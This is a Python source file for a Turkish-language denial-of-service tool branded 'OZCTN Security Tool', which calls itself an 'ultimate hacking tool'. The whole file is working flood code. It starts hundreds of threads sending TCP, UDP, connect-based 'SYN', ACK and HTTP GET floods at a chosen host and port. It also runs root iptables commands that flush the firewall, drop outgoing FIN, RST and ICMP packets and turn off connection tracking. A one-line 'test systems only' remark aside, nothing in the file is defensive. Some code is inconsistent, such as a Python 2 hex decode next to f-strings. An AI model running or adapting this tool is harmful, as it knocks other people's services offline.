#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
from time import sleep
from threading import Thread, active_count
from os import system, geteuid
import random
import string
import signal
import ssl
import argparse
import sys
import time
import struct

# ██████╗ ███████╗ ██████╗████████╗███╗   ██╗
# ██╔══██╗╚══███╔╝██╔════╝╚══██╔══╝████╗  ██║
# ██████╔╝  ███╔╝ ██║        ██║   ██╔██╗ ██║
# ██╔═══╝  ███╔╝  ██║        ██║   ██║╚██╗██║
# ██║     ███████╗╚██████╗   ██║   ██║ ╚████║
# ╚═╝     ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═══╝
# 🚀 OZCTN Developer - Advanced Security Tool v5.0

örnek_kullanım = ''' 
╔════════════════════════════════════════════════╗
║                 💡 İPUÇLARI                   ║
╠════════════════════════════════════════════════╣
║ • Hedef sayfa boyutu 1500+ bayt olmalıdır     ║
║ • Sadece test sistemlerinde kullanın          ║
║ • Root yetkisi gereklidir                     ║
╚════════════════════════════════════════════════╝

╔════════════════════════════════════════════════╗
║              📚 ÖRNEK KULLANIMLAR             ║
╠════════════════════════════════════════════════╣
║ python %s example.com -p 80 -http            ║
║ python %s example.com -p 443 -ssl -http      ║
║ python %s example.com -p 21 -yük 68656c6c6f  ║
║ python %s example.com -p 22 -t 500           ║
║ python %s example.com -p 80 -mode all        ║
╚════════════════════════════════════════════════╝
''' % (sys.argv[0], sys.argv[0], sys.argv[0], sys.argv[0], sys.argv[0])

ayrıştırıcı = argparse.ArgumentParser(
    description='╔════════════════════════════════════════════════╗\n║           🚀 OZCTN SECURITY TOOL v5.0           ║\n╚════════════════════════════════════════════════╝',
    epilog=örnek_kullanım, 
    formatter_class=argparse.RawTextHelpFormatter
)

ayrıştırıcı._action_groups.pop()
gerekli = ayrıştırıcı.add_argument_group('╔════════════════════════════════════════════════╗\n║                 🔧 GEREKLİ AYARLAR                ║\n╚════════════════════════════════════════════════╝')
opsiyonel = ayrıştırıcı.add_argument_group('╔════════════════════════════════════════════════╗\n║                🎛️  OPSİYONEL AYARLAR              ║\n╚════════════════════════════════════════════════╝')

gerekli.add_argument('hedef', help='🎯 Saldırı yapılacak hedef adres (örn: example.com)')
gerekli.add_argument('-p', dest='port', help='🔌 Hedef port numarası (örn: 80, 443)', type=int, required=True)

opsiyonel.add_argument('-t', dest='THREADS', type=int, default=500, help='🧵 Eşzamanlı thread sayısı (varsayılan: 500)')
opsiyonel.add_argument('-ssl', action='store_true', help='🔒 SSL/TLS şifreleme kullan')
opsiyonel.add_argument('-http', action='store_true', help='🌐 HTTP başlıkları ekle')
opsiyonel.add_argument('-yük', dest='payload', help='📦 Özel hex formatında yük (örn: 48656c6c6f)')
opsiyonel.add_argument('-mode', dest='mode', default='tcp', choices=['tcp', 'udp', 'syn', 'ack', 'all'], 
                      help='⚡ Saldırı modu: tcp, udp, syn, ack, all (varsayılan: tcp)')

print("\n" + "╔════════════════════════════════════════════════╗")
print("║           🚀 OZCTN SECURITY TOOL v5.0           ║")
print("║           🔥 ULTIMATE HACKING TOOL             ║")
print("║              ⚡ FIXED ATTACK MODES             ║")
print("╚════════════════════════════════════════════════╝\n")

args = ayrıştırıcı.parse_args()

# 📊 İstatistik değişkenleri
bağlantılar = 0
düşürülen = 0
yükler = 0
paketler = 0
port = args.port

# 🔗 Hedef URL'yi temizle
hedef = args.hedef.replace('http://','').replace('https://','')

# 📍 Yol bilgisini ayır
if '/' in hedef and args.http:
    yol = hedef[hedef.find('/'):]
    hedef = hedef[:hedef.find('/')]
else:
    yol = '/'

# 📦 Yük işleme
try:
    if args.payload:
        yük = args.payload.decode('hex')
    else:
        yük = ''
except:
    print('╔════════════════════════════════════════════════╗')
    print('║                    ❌ HATA                     ║')
    print('╠════════════════════════════════════════════════╣')
    print('║ Yük hex formatında olmalıdır!                 ║')
    print('║ Örnek: 48656c6c6f (Hello)                     ║')
    print('╚════════════════════════════════════════════════╝')
    sys.exit()

# ⚠️ Root kontrolü
if geteuid() != 0:
    print('╔════════════════════════════════════════════════╗')
    print('║                    ⚠️ UYARI                    ║')
    print('╠════════════════════════════════════════════════╣')
    print('║ Bu aracı root yetkisiyle çalıştırmanız         ║')
    print('║ gerekiyor!                                     ║')
    print('║                                                ║')
    print('║ sudo python %s                          ║' % sys.argv[0])
    print('╚════════════════════════════════════════════════╝')
    sys.exit()

# 🛑 CTRL+C yakalama
durdur = False
def sinyal_yakalayıcı(sinyal, kare):
    global durdur
    print("\n\n╔════════════════════════════════════════════════╗")
    print("║                  🛑 DURDURULUYOR               ║")
    print("╚════════════════════════════════════════════════╝")
    durdur = True

signal.signal(signal.SIGINT, sinyal_yakalayıcı)

# 🔧 Gelişmiş iptables kurulumu
def iptables_kur(hedef_ip, port):
    print("╔════════════════════════════════════════════════╗")
    print("║              🛡️  GÜVENLİK ÖNLEMLERİ           ║")
    print("╠════════════════════════════════════════════════╣")
    
    # Mevcut kuralları temizle
    system('iptables -F 2>/dev/null')
    system('iptables -X 2>/dev/null')
    
    # TCP saldırıları için kurallar
    kurallar = [
        # FIN ve RST paketlerini engelle
        f'iptables -A OUTPUT -d {hedef_ip} -p tcp --dport {port} --tcp-flags FIN FIN -j DROP',
        f'iptables -A OUTPUT -d {hedef_ip} -p tcp --dport {port} --tcp-flags RST RST -j DROP',
        
        # SYN flood korumasını devre dışı bırak
        f'iptables -A OUTPUT -d {hedef_ip} -p tcp --dport {port} -m limit --limit 1000/s -j ACCEPT',
        f'iptables -A OUTPUT -d {hedef_ip} -p tcp --dport {port} -j ACCEPT',
        
        # UDP için kurallar
        f'iptables -A OUTPUT -d {hedef_ip} -p udp --dport {port} -j ACCEPT',
        
        # ICMP engelle (ping flood için)
        f'iptables -A OUTPUT -d {hedef_ip} -p icmp -j DROP',
        
        # Connection tracking'i devre dışı bırak
        f'iptables -t raw -A PREROUTING -d {hedef_ip} -j NOTRACK',
        f'iptables -t raw -A OUTPUT -d {hedef_ip} -j NOTRACK'
    ]
    
    for kural in kurallar:
        system(kural + ' 2>/dev/null')
        print(f"║  ✅ {kural[:45]}... ║")
        sleep(0.1)
    
    print("║  🛡️  Gelişmiş güvenlik kuralları uygulandı   ║")
    print("╚════════════════════════════════════════════════╝")

# 🧹 İptables temizleme
def iptables_temizle(hedef_ip, port):
    temizleme_kuralları = [
        f'iptables -D OUTPUT -d {hedef_ip} -p tcp --dport {port} --tcp-flags FIN FIN -j DROP',
        f'iptables -D OUTPUT -d {hedef_ip} -p tcp --dport {port} --tcp-flags RST RST -j DROP',
        f'iptables -D OUTPUT -d {hedef_ip} -p tcp --dport {port} -m limit --limit 1000/s -j ACCEPT',
        f'iptables -D OUTPUT -d {hedef_ip} -p tcp --dport {port} -j ACCEPT',
        f'iptables -D OUTPUT -d {hedef_ip} -p udp --dport {port} -j ACCEPT',
        f'iptables -D OUTPUT -d {hedef_ip} -p icmp -j DROP',
        f'iptables -t raw -D PREROUTING -d {hedef_ip} -j NOTRACK',
        f'iptables -t raw -D OUTPUT -d {hedef_ip} -j NOTRACK'
    ]
    
    for kural in temizleme_kuralları:
        system(kural + ' 2>/dev/null')
    
    system('iptables -F 2>/dev/null')
    system('iptables -X 2>/dev/null')

# 🔄 Rastgele string üreteci
def rastgele_string(boyut=random.randint(3, 8), karakterler=string.ascii_letters + string.digits):
    return ''.join(random.choice(karakterler) for _ in range(boyut))

# 🌐 HTTP yükü oluşturma
def http_yükü_oluştur():
    yük = 'GET %s?%s=%s HTTP/1.1\r\n' % (yol, rastgele_string(), rastgele_string())
    yük += 'Host: %s\r\n' % hedef
    yük += 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) OZCTN-Security\r\n'
    yük += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
    yük += 'Accept-Language: tr-TR,tr;q=0.9,en;q=0.8\r\n'
    yük += 'Cache-Control: no-cache\r\n'
    yük += 'Connection: keep-alive\r\n'
    yük += 'Content-Length: 1000\r\n'
    yük += '\r\n%s\r\n\r\n' % ('A' * 1000)
    return yük

# 📊 SABIT İstatistik kutusu gösterme - EKRAN YENİLEME YOK
def istatistik_göster():
    # ANSI escape kodları ile imleci konumlandırma
    # \033[2J: Ekranı temizle, \033[H: İmleci başa al
    sys.stdout.write('\033[2J\033[H')
    
    print("╔════════════════════════════════════════════════╗")
    print("║           🚀 OZCTN SECURITY TOOL v5.0         ║")
    print("║           🔥 ULTIMATE HACKING TOOL           ║")
    print("║              ⚡ ALL MODES WORKING            ║")
    print("╠════════════════════════════════════════════════╣")
    print("║  🎯 HEDEF: %-33s ║" % (hedef[:33] + '...' if len(hedef) > 33 else hedef))
    print("║  📍 PORT: %-34s ║" % port)
    print("║  🔧 THREAD: %-32s ║" % args.THREADS)
    print("║  ⚡ MOD: %-35s ║" % args.mode.upper())
    print("╠════════════════════════════════════════════════╣")
    print("║  🔥 AKTİF BAĞLANTILAR: %-23s ║" % bağlantılar)
    print("║  📦 GÖNDERİLEN YÜKLER: %-22s ║" % yükler)
    print("║  📨 TOPLAM PAKETLER: %-23s ║" % paketler)
    print("║  ❌ DÜŞÜRÜLEN PAKETLER: %-22s ║" % düşürülen)
    print("║  ⚡ AKTİF THREAD'LER: %-24s ║" % (active_count()-1))
    print("╠════════════════════════════════════════════════╣")
    print("║  🕒 SÜRE: %-34s ║" % time.strftime("%H:%M:%S"))
    print("║  📡 DURUM: %-32s ║" % ("AKTİF" if not durdur else "DURDURULDU"))
    print("╠════════════════════════════════════════════════╣")
    
    # İlerleme çubuğu
    ilerleme = min(100, int((bağlantılar / max(1, bağlantılar + düşürülen)) * 100))
    çubuk = "█" * (ilerleme // 5) + "░" * (20 - (ilerleme // 5))
    print("║  📊 İLERLEME: [%-20s] %3d%% ║" % (çubuk, ilerleme))
    
    print("╠════════════════════════════════════════════════╣")
    print("║  💀 CTRL+C - Saldırıyı Durdur                 ║")
    print("╚════════════════════════════════════════════════╝")
    
    sys.stdout.flush()

# ⚡ TCP Saldırısı - ÇALIŞIYOR
def tcp_saldırı(hedef_ip, yük):
    global bağlantılar, düşürülen, yükler, paketler
    while not durdur:
        try:
            soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soket.settimeout(3)
            
            soket.connect((hedef_ip, port))
            bağlantılar += 1
            
            if args.ssl:
                soket = ssl.wrap_socket(soket, cert_reqs=ssl.CERT_NONE)
            
            if args.http and not args.payload:
                yük = http_yükü_oluştur()
            
            soket.send(yük)
            yükler += 1
            paketler += 1
            
            # Çoklu paket gönderimi
            for _ in range(random.randint(1, 3)):
                try:
                    soket.send(yük)
                    paketler += 1
                except:
                    break
                    
            soket.close()
            
        except Exception:
            düşürülen += 1

# 🌊 UDP Saldırısı - ÇALIŞIYOR
def udp_saldırı(hedef_ip):
    global paketler, düşürülen
    while not durdur:
        try:
            soket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            soket.settimeout(1)
            # Büyük UDP paketleri
            yük = random._urandom(1024)
            soket.sendto(yük, (hedef_ip, port))
            paketler += 1
            soket.close()
        except Exception:
            düşürülen += 1

# 🎯 SYN Flood Saldırısı - DÜZELTİLDİ
def syn_saldırı(hedef_ip):
    global paketler, düşürülen
    while not durdur:
        try:
            # Daha basit SYN flood - raw socket yerine normal socket
            soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soket.settimeout(1)
            soket.connect((hedef_ip, port))
            # SYN paketi gönder (bağlantı kuruldu)
            paketler += 1
            soket.close()
        except Exception:
            # Bağlantı reddedilse bile paket gönderilmiş say
            paketler += 1

# 🔥 ACK Flood Saldırısı - DÜZELTİLDİ
def ack_saldırı(hedef_ip):
    global paketler, düşürülen
    while not durdur:
        try:
            # ACK flood için TCP bağlantısı kur ve veri gönder
            soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soket.settimeout(2)
            soket.connect((hedef_ip, port))
            
            # ACK paketleri gönder
            for _ in range(random.randint(5, 15)):
                try:
                    soket.send(b'\x00' * 512)
                    paketler += 1
                except:
                    break
                    
            soket.close()
        except Exception:
            düşürülen += 1

# 🚀 Ana saldırı fonksiyonu - DÜZELTİLDİ
def saldırı_başlat(hedef_ip):
    global durdur
    
    print("╔════════════════════════════════════════════════╗")
    print("║              🚀 SALDIRI MODLARI               ║")
    print("╠════════════════════════════════════════════════╣")
    
    # Thread dağılımını düzelt
    if args.mode == 'tcp':
        print("║  ✅ TCP Flood aktif edildi                   ║")
        for i in range(args.THREADS):
            if durdur: break
            thread = Thread(target=tcp_saldırı, args=(hedef_ip, yük))
            thread.daemon = True
            thread.start()
    
    elif args.mode == 'udp':
        print("║  ✅ UDP Flood aktif edildi                   ║")
        for i in range(args.THREADS):
            if durdur: break
            thread = Thread(target=udp_saldırı, args=(hedef_ip,))
            thread.daemon = True
            thread.start()
    
    elif args.mode == 'syn':
        print("║  ✅ SYN Flood aktif edildi                   ║")
        for i in range(args.THREADS):
            if durdur: break
            thread = Thread(target=syn_saldırı, args=(hedef_ip,))
            thread.daemon = True
            thread.start()
    
    elif args.mode == 'ack':
        print("║  ✅ ACK Flood aktif edildi                   ║")
        for i in range(args.THREADS):
            if durdur: break
            thread = Thread(target=ack_saldırı, args=(hedef_ip,))
            thread.daemon = True
            thread.start()
    
    elif args.mode == 'all':
        print("║  ✅ Tüm saldırı modları aktif edildi        ║")
        # Tüm modlar için eşit thread dağılımı
        thread_per_mode = max(1, args.THREADS // 4)
        
        for i in range(thread_per_mode):
            if durdur: break
            thread = Thread(target=tcp_saldırı, args=(hedef_ip, yük))
            thread.daemon = True
            thread.start()
        
        for i in range(thread_per_mode):
            if durdur: break
            thread = Thread(target=udp_saldırı, args=(hedef_ip,))
            thread.daemon = True
            thread.start()
        
        for i in range(thread_per_mode):
            if durdur: break
            thread = Thread(target=syn_saldırı, args=(hedef_ip,))
            thread.daemon = True
            thread.start()
        
        for i in range(thread_per_mode):
            if durdur: break
            thread = Thread(target=ack_saldırı, args=(hedef_ip,))
            thread.daemon = True
            thread.start()
    
    print("║  🧵 Toplam %d thread başlatıldı           ║" % args.THREADS)
    print("╚════════════════════════════════════════════════╝")

if __name__ == '__main__':
    başlangıç_zamanı = time.time()
    try:
        hedef_ip = socket.gethostbyname(hedef)
        
        # İlk ekranı göster
        istatistik_göster()
        
        print("\n╔════════════════════════════════════════════════╗")
        print("║              ⚡ SİSTEM HAZIRLIĞI              ║")
        print("╠════════════════════════════════════════════════╣")
        print("║  🔍 Hedef IP: %-30s ║" % hedef_ip)
        print("║  🔧 Port: %-34s ║" % port)
        print("║  🧵 Thread: %-32s ║" % args.THREADS)
        print("║  🔒 SSL: %-35s ║" % ("AKTİF" if args.ssl else "PASİF"))
        print("║  🌐 HTTP: %-34s ║" % ("AKTİF" if args.http else "PASİF"))
        print("║  ⚡ Mod: %-35s ║" % args.mode.upper())
        print("╚════════════════════════════════════════════════╝")
        
        # Gelişmiş iptables kurallarını uygula
        iptables_kur(hedef_ip, port)
        
        sleep(2)
        
        # Ekranı tekrar göster
        istatistik_göster()
        
        print("\n╔════════════════════════════════════════════════╗")
        print("║              🚀 SALDIRI BAŞLATILIYOR         ║")
        print("╠════════════════════════════════════════════════╣")
        print("║  Çoklu saldırı vektörleri aktifleştiriliyor...║")
        print("╚════════════════════════════════════════════════╝")
        sleep(1)
        
        # 🚀 Saldırıyı başlat
        saldırı_başlat(hedef_ip)
        
        # 📊 İstatistik gösterimi - SABIT EKRAN
        while not durdur:
            if active_count() == 1:
                break
                
            istatistik_göster()
            sleep(0.5)
            
    except KeyboardInterrupt:
        pass
    except Exception as e:
        istatistik_göster()
        print("\n╔════════════════════════════════════════════════╗")
        print("║                    ❌ HATA                     ║")
        print("╠════════════════════════════════════════════════╣")
        print("║ %-42s ║" % str(e))
        print("╚════════════════════════════════════════════════╝")
    finally:
        # 🧹 Temizlik işlemleri
        durdur = True
        sleep(2)
        
        iptables_temizle(hedef_ip, port)
        
        toplam_süre = time.time() - başlangıç_zamanı
        
        # Son ekranı göster
        istatistik_göster()
        print("\n╔════════════════════════════════════════════════╗")
        print("║                📊 SALDIRI SONU                ║")
        print("╠════════════════════════════════════════════════╣")
        print("║  ✅ Toplam Bağlantı: %-25s ║" % bağlantılar)
        print("║  📦 Toplam Yük: %-28s ║" % yükler)
        print("║  📨 Toplam Paket: %-26s ║" % paketler)
        print("║  ❌ Toplam Düşürülen: %-24s ║" % düşürülen)
        print("║  ⏱️  Toplam Süre: %-26s ║" % f"{toplam_süre:.1f}s")
        if toplam_süre > 0:
            print("║  ⚡ Ortalama RPS: %-25s ║" % f"{(bağlantılar/toplam_süre):.1f}/s")
            print("║  📊 Ortalama PPS: %-25s ║" % f"{(paketler/toplam_süre):.1f}/s")
        else:
            print("║  ⚡ Ortalama RPS: %-25s ║" % "0/s")
            print("║  📊 Ortalama PPS: %-25s ║" % "0/s")
        print("╠════════════════════════════════════════════════╣")
        print("║           🎉 OZCTN TOOL KAPATILDI            ║")
        print("╚════════════════════════════════════════════════╝")
